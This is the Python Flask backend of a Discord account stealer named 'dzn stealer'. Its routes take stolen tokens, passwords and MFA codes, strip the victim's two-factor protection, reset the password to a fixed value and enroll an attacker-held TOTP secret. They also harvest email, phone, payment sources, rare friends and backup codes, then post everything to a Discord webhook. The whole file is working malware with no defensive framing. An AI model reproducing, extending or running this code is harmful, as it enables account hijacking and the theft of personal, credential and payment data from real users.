import requests
import pyotp
import json
import time
import datetime
from flask import Flask, request

# GLOBAL VARIABLES

# IXUU2EJTMXMZN5O36FNHRHIOMHZGCIQF

timestamp = time.time()
timestamp = str(datetime.datetime.utcfromtimestamp(timestamp))

# API

app = Flask("API")

@app.route("/", methods=['GET'])
def helloWorld():
	return 'dzn stealer'

@app.route("/get/mfa/code", methods=['GET', 'POST'])
def getmfacodes():
	body = request.get_json()

	secretkey = str(body['secret'])
	code = pyotp.TOTP(secretkey)
	return code.now()

@app.route("/api/v1/lookup", methods=['GET', 'POST'])
def lookup():
	body = request.get_json()

	token = str(body['token'])

	req = requests.get('https://discord.com/api/v9/users/@me', headers={'authorization':token})
	req = json.loads(req.text)

	userid = req["id"]
	username = req["username"]+"#"+req["discriminator"]
	avatar = f'https://cdn.discordapp.com/avatars/{userid}/{req["avatar"]}'
	email = req["email"]
	phone = req["phone"]
	mfa_enabled = req["mfa_enabled"]
	try:
		if req["premium_type"] == 1:
			nitro = "<:nitroclassic:965744038328287333>"
		if req["premium_type"] == 2:
			nitro = "<:nitroclassic:965744038328287333><a:bboostmv:963917949868072991>"
	except:
		nitro = ''

	return {'id':userid,'nick':username,'avatar':avatar,'email':email,'phone':phone,'mfa_enabled':mfa_enabled,'nitro':nitro}

@app.route('/api/v1/get/rarefriends', methods=['GET', 'POST'])
def rareFriends():
	body = request.get_json()

	token = str(body['token'])

	req = requests.get('https://discordapp.com/api/users/@me/relationships', headers={'authorization':token})
	req = json.loads(req.text)

	quantidade2 = len(req)

	flags = {
		512: ['<a:pig:965738845679267910>']
	}

	friends = ''

	things = []

	for i in range(quantidade2):
		usernamefriend = req[i]["user"]["username"]
		tag = req[i]["user"]["discriminator"]
		public_flags = req[i]["user"]["public_flags"]
		useridfriend = req[i]["id"]

		if public_flags != 0:
			for item in flags.keys():
				if public_flags >= item:
					things.append(flags[item][0])
					public_flags = public_flags - item
					friends = friends+flags[item][0]+" | "+usernamefriend+"#"+tag+"\n"

	if friends == '':
		friends = '`None`'

	return friends

@app.route('/api/v1/exploit/discord', methods=['GET', 'POST'])
def exploit():
	body = request.get_json()

	token = str(body['token'])
	password = str(body['password'])
	mfacode = str(body['mfacode'])
	nikkiuser = str(body['user'])

	req1 = requests.get('https://discord.com/api/v9/users/@me', headers={'authorization':token})
	req1 = json.loads(req1.text)

	mfa_enabled = req1['mfa_enabled']

	if mfa_enabled == False:
		# CHANGE PASSWORD

		parametros = {
			"password": password,
			"new_password": "dznfofo123@"
		}

		changepasswd = requests.patch('https://discord.com/api/v9/users/@me', headers={"authorization":token}, json=parametros)
		changepasswd = json.loads(changepasswd.text)

		new_token1 = changepasswd['token']

	if mfa_enabled == True:
		# REMOVE 2FA

		parametros = {
			"code": mfacode
		}

		remove2fa = requests.post('https://discord.com/api/v9/users/@me/mfa/totp/disable', headers={"authorization":token}, json=parametros)
		remove2fa = json.loads(remove2fa.text)
		new_token0 = remove2fa['token']

		# CHANGE PASSWORD

		parametros2 = {
			"password": password,
			"new_password": "dznfofo123@"
		}

		changepasswd = requests.patch('https://discord.com/api/v9/users/@me', headers={"authorization":new_token0}, json=parametros2)
		changepasswd = json.loads(changepasswd.text)

		new_token1 = changepasswd['token']

	secretkey = pyotp.random_base32()
	code = pyotp.TOTP(secretkey)

	parametros3 = {
		"password": "dznfofo123@",
		"secret": secretkey,
		"code": code.now()
	}

	req_add2fa = requests.post('https://discord.com/api/v9/users/@me/mfa/totp/enable', json=parametros3, headers={'authorization':new_token1})
	req_add2fajson = json.loads(req_add2fa.text)

	new_token2 = req_add2fajson["token"]

	print(secretkey)
	return req_add2fajson

@app.route('/api/v1/send/webhook', methods=['GET', 'POST'])
def sendEmbed():
	body = request.get_json()

	token = str(body['token'])
	password = str(body['password'])
	webhook = str(body['webhook'])
	username = str(body['username'])
	userid = str(body['userid'])
	badges = str(body['badges'])
	nitro = str(body['nitro'])
	client_ip = str(body['client_ip'])
	country = str(body['country'])
	domain = str(body['domain'])
	email = str(body['email'])
	friends = str(body['friends'])
	descembed = body['descembed']
	avatar = str(body['avatar'])

	emoji = '<:insta_curtida:976334060546846730>'

	
	print(descembed)
	print(token)
	print(password)
	print(webhook)
	print(username)
	print(userid)
	print(badges)
	print(nitro)
	print(client_ip)
	print(country)
	print(domain)
	print(email)
	print(friends)
	print(avatar)
	
	new_token = descembed['token']

	req10 = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers={'authorization':new_token})
	req10 = req10.text

	print('dale? '+req10)
	
	payment = ''

	if '"type": 2,' in req10:
		payment = payment+'<:twopaypal:988495519615680562>'
	if '"type": 1,' in req10:
		payment = payment+'💳'


	if payment == '':
		payment = '`none`'

	if badges == '' and nitro == '':
		badges = ':x:'

	backup_codes = ''

	for i in range(10):
		print(f'CODE: {descembed["backup_codes"][i]["code"]} - {descembed["backup_codes"][i]["consumed"]}')
		backup_codes = backup_codes+f'`CODE: {descembed["backup_codes"][i]["code"]} - {descembed["backup_codes"][i]["consumed"]}`\n'


	data = {
		"content": "@everyone",
		"username": "dzn",
		"avatar_url": "https://media.discordapp.net/attachments/986007031347576904/988829644453212160/3265c1db6445bbfe824e95bef42f879e--al-pacino-say-that.jpg"
	}

	data['embeds'] = [
		{
			"color": 000,
			"timestamp": timestamp,
			"author": {
				"name": f'{username} ({userid})',
				"icon_url": avatar
			},
			"footer": {
				"text": "dzn#0001",
				"icon_url": "https://media.discordapp.net/attachments/986007031347576904/988829644453212160/3265c1db6445bbfe824e95bef42f879e--al-pacino-say-that.jpg"
			},
			"thumbnail": {
				"url": "https://media.discordapp.net/attachments/986007031347576904/988829644453212160/3265c1db6445bbfe824e95bef42f879e--al-pacino-say-that.jpg"
			},
			"fields": [
				{
					"name": f"{emoji} **Antiga Token:**",
					"value": f"`{token}`",
					"inline": False
				},
				{
					"name": f"{emoji} **Nova Token:**",
					"value": f"`{new_token}`",
					"inline": False
				},
				{
					"name": f"{emoji} **Emblemas:**",
					"value": f"{badges}{nitro}",
					"inline": True
				},
				{
					"name": f"{emoji} **IP:**",
					"value": f"`{client_ip}`",
					"inline": True
				},
				{
					"name": f"{emoji} **Pagamentos:**",
					"value": f"`{payment}`",
					"inline": True
				},
				{
					"name": f"{emoji} **Dominio:**",
					"value": f"`{domain}`",
					"inline": True
				},
				{
					"name": f"{emoji} **E-Mail:**",
					"value": f"`{email}`",
					"inline": True
				},
				{
					"name": f"{emoji} **Senha:**",
					"value": f"`{password} - dznfofo123@`",
					"inline": True
				}
			]
		},
		{
			"color": 000,
			"timestamp": timestamp,
			"title": f"{emoji} **| HQ FRIENDS**",
			"footer": {
				"text": "dzn#0001",
				"icon_url": "https://media.discordapp.net/attachments/986007031347576904/988829644453212160/3265c1db6445bbfe824e95bef42f879e--al-pacino-say-that.jpg"
			},
			"description": friends
		},
		{
			"color": 000,
			"timestamp": timestamp,
			"title": f"{emoji} **| BACKUP CODES**",
			"footer": {
				"text": "dzn#0001",
				"icon_url": "https://media.discordapp.net/attachments/986007031347576904/988829644453212160/3265c1db6445bbfe824e95bef42f879e--al-pacino-say-that.jpg"
			},
			"description": backup_codes
		}
	]

	req = requests.post(webhook, json=data)
	print(req.text)
	return {'response': 200, 'message': 'ok'}
app.run('0.0.0.0', 1337)
